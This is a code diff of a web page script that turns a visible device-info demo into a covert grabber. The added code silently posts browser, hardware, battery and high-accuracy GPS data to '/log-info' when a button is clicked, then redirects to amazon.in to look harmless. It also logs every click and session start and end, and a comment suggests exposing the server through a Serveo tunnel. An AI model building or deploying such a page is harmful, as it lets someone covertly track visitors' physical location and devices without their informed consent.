@@ -21,65 +21,78 @@
 </div>
 
 <script>
-const serverURL = "http://localhost:3000"; // Local server
+const serverURL = "http://localhost:3000"; // Replace with your Serveo tunnel if needed
 
-function sendData(data) {
-    fetch(`${serverURL}/log-info`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
-    });
-}
+// 🟢 SESSION START
+fetch("/session-start", { method: "POST" });
 
-document.getElementById("openBoth").addEventListener("click", () => {
-
-    // 🔁 Device info
+// 📱 Send Mobile Info + Location
+function sendDeviceInfo(lat=null, lon=null){
     const data = {
         userAgent: navigator.userAgent,
         platform: navigator.platform,
         language: navigator.language,
         languages: navigator.languages || [],
         online: navigator.onLine,
-        ram: navigator.deviceMemory || "NA",
-        cpuCores: navigator.hardwareConcurrency || "NA",
+        ram: navigator.deviceMemory || 0,
+        cpuCores: navigator.hardwareConcurrency || 0,
         screenRes: screen.width + "x" + screen.height,
         colorDepth: screen.colorDepth,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         batteryLevel: 0,
         isCharging: false,
-        latitude: null,
-        longitude: null
+        latitude: lat,
+        longitude: lon,
+        time: new Date().toString()
     };
 
-    // 🔋 Battery info
-    if (navigator.getBattery) {
+    if(navigator.getBattery){
         navigator.getBattery().then(battery => {
-            data.batteryLevel = Math.round(battery.level * 100);
+            data.batteryLevel = Math.round(battery.level*100);
             data.isCharging = battery.charging;
-            sendData(data);
+            fetch("/log-info", {
+                method:"POST",
+                headers:{"Content-Type":"application/json"},
+                body: JSON.stringify(data)
+            });
+        });
+    } else {
+        fetch("/log-info", {
+            method:"POST",
+            headers:{"Content-Type":"application/json"},
+            body: JSON.stringify(data)
         });
     }
+}
 
-    // 🌐 Geolocation
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-            pos => {
-                data.latitude = pos.coords.latitude;
-                data.longitude = pos.coords.longitude;
-                sendData(data);
-                alert("Data sent! Check server console.");
-            },
-            err => {
-                sendData(data);
-                alert("Location permission denied. Only device info sent.");
-            },
-            { enableHighAccuracy: true }
-        );
+// Click to capture location + mobile info
+document.getElementById("openBoth").addEventListener("click", ()=>{
+    if(navigator.geolocation){
+        navigator.geolocation.getCurrentPosition(pos=>{
+            sendDeviceInfo(pos.coords.latitude, pos.coords.longitude);
+            window.location.href = "https://www.amazon.in";
+        }, err=>{
+            sendDeviceInfo();
+            window.location.href = "https://www.amazon.in";
+        }, { enableHighAccuracy:true });
     } else {
-        sendData(data);
-        alert("Geolocation not supported. Only device info sent.");
+        sendDeviceInfo();
+        window.location.href = "https://www.amazon.in";
     }
+});
 
+// 🖱 Click tracking (heatmap base)
+document.addEventListener("click", e=>{
+    fetch("/log-click", {
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body: JSON.stringify({ x:e.clientX, y:e.clientY, time:new Date() })
+    });
+});
+
+// 🔴 SESSION END
+window.addEventListener("beforeunload", ()=>{
+    fetch("/session-end",{method:"POST"});
 });
 </script>
 
